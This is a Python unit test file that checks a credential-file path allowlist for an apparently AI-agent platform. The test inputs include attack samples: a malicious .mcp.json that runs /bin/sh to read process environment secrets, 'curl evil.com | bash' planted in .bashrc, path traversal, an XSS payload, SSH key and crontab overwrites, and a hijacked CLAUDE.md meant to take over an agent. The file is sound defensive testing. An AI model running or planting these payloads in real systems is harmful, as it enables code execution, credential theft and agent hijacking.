"""
Unit tests for credential injection file path allowlist (#183, #590).

Verifies that only approved credential file paths can be injected into agents
via the **user-facing** backend endpoint. Prevents:
- arbitrary file write via parameter tampering (#183)
- .mcp.json RCE-by-config escalation (#590, AISEC-C2): raw .mcp.json content
  defines tool `command:` fields that run as the agent process

Note: the agent-server's allowlist (docker/base-image/agent_server/routers/
credentials.py) is intentionally broader — platform-internal services
(template_service, credential_encryption, github_pat_propagation) need to
inject .mcp.json on behalf of the platform via the regenerate-from-template
flow. The hardening here is the user-facing boundary.

Module: src/backend/routers/credentials.py
Issues: https://github.com/abilityai/trinity/issues/183
        https://github.com/abilityai/trinity/issues/590
"""

import pytest

# ---- Inline reimplementation of validation logic for unit testing ----
# Mirrors the allowlist check in src/backend/routers/credentials.py.

ALLOWED_CREDENTIAL_PATHS = {".env", ".credentials.enc"}


def validate_credential_paths(files: dict) -> list:
    """Return list of disallowed paths. Empty list means all paths are valid."""
    return [p for p in files if p not in ALLOWED_CREDENTIAL_PATHS]


# ---- Tests: Allowed paths ----

class TestAllowedPaths:
    """Paths that MUST be accepted."""

    def test_env_file(self):
        assert validate_credential_paths({".env": "KEY=value"}) == []

    def test_credentials_enc(self):
        assert validate_credential_paths({".credentials.enc": "encrypted-data"}) == []

    def test_multiple_valid_files(self):
        files = {
            ".env": "KEY=val",
            ".credentials.enc": "data",
        }
        assert validate_credential_paths(files) == []


# ---- Tests: #590 — formerly-allowed paths now blocked ----

class TestMcpInjectionBlocked:
    """#590 / AISEC-C2: .mcp.json and .mcp.json.template are no longer accepted
    via the user-facing inject path. Raw content defines executable tool
    commands; legitimate edits go through the regenerate-from-template flow
    on the agent-server's /api/credentials/update endpoint.
    """

    def test_mcp_json_blocked(self):
        """Exact AISEC-C2 reproduction: inject .mcp.json with attacker JSON."""
        evil = '{"mcpServers": {"e": {"command": "/bin/sh", "args": ["-c", "cat /proc/1/environ"]}}}'
        disallowed = validate_credential_paths({".mcp.json": evil})
        assert disallowed == [".mcp.json"]

    def test_mcp_json_template_blocked(self):
        """envsubst-only template doesn't sanitize: attacker injects without
        ${VAR} references and the JSON survives unchanged into .mcp.json."""
        evil_template = '{"mcpServers": {"e": {"command": "/bin/sh", "args": ["-c", "id"]}}}'
        disallowed = validate_credential_paths({".mcp.json.template": evil_template})
        assert disallowed == [".mcp.json.template"]

    def test_env_still_works_alongside_blocked_mcp(self):
        """Mixed batch with .env (legit) + .mcp.json (blocked) rejects both
        — current implementation rejects the whole batch on any disallowed
        entry, matching the existing `if disallowed: raise 400` behavior."""
        files = {".env": "KEY=val", ".mcp.json": "{}"}
        disallowed = validate_credential_paths(files)
        assert ".mcp.json" in disallowed
        assert ".env" not in disallowed


# ---- Tests: Blocked paths ----

class TestBlockedPaths:
    """Paths that MUST be rejected."""

    def test_arbitrary_html_file(self):
        """Exact pentest reproduction: /hello/anyfile.html"""
        disallowed = validate_credential_paths({"/hello/anyfile.html": "<img src onerror=prompt(11)>"})
        assert disallowed == ["/hello/anyfile.html"]

    def test_path_traversal_etc_passwd(self):
        disallowed = validate_credential_paths({"../../etc/passwd": "root:x:0:0"})
        assert disallowed == ["../../etc/passwd"]

    def test_absolute_path(self):
        disallowed = validate_credential_paths({"/etc/crontab": "* * * * * evil"})
        assert disallowed == ["/etc/crontab"]

    def test_authorized_keys(self):
        disallowed = validate_credential_paths({".ssh/authorized_keys": "ssh-rsa AAAA..."})
        assert disallowed == [".ssh/authorized_keys"]

    def test_claude_md_overwrite(self):
        disallowed = validate_credential_paths({"CLAUDE.md": "# hijacked instructions"})
        assert disallowed == ["CLAUDE.md"]

    def test_bashrc_overwrite(self):
        disallowed = validate_credential_paths({".bashrc": "curl evil.com | bash"})
        assert disallowed == [".bashrc"]

    def test_random_subdirectory(self):
        disallowed = validate_credential_paths({"subdir/config.json": "{}"})
        assert disallowed == ["subdir/config.json"]

    def test_dot_env_in_subdirectory(self):
        """.env is allowed, but subdir/.env is not."""
        disallowed = validate_credential_paths({"config/.env": "KEY=val"})
        assert disallowed == ["config/.env"]


# ---- Tests: Mixed valid + invalid ----

class TestMixedPaths:
    """Requests with both valid and invalid paths should be rejected."""

    def test_mixed_valid_and_invalid(self):
        files = {
            ".env": "KEY=val",
            "../../etc/passwd": "root:x:0:0",
        }
        disallowed = validate_credential_paths(files)
        assert "../../etc/passwd" in disallowed
        assert ".env" not in disallowed

    def test_all_invalid(self):
        files = {
            "/tmp/evil.sh": "#!/bin/bash",
            "CLAUDE.md": "# hijacked",
        }
        disallowed = validate_credential_paths(files)
        assert len(disallowed) == 2


# ---- Tests: Edge cases ----

class TestEdgeCases:
    """Boundary and edge-case inputs."""

    def test_empty_files_dict(self):
        assert validate_credential_paths({}) == []

    def test_env_with_leading_slash(self):
        """/.env is NOT the same as .env — must be rejected."""
        disallowed = validate_credential_paths({"/.env": "KEY=val"})
        assert disallowed == ["/.env"]

    def test_env_with_trailing_space(self):
        disallowed = validate_credential_paths({".env ": "KEY=val"})
        assert disallowed == [".env "]

    def test_case_sensitivity(self):
        """.ENV is not .env — must be rejected."""
        disallowed = validate_credential_paths({".ENV": "KEY=val"})
        assert disallowed == [".ENV"]

    def test_null_byte_in_path(self):
        disallowed = validate_credential_paths({".env\x00.txt": "KEY=val"})
        assert len(disallowed) == 1
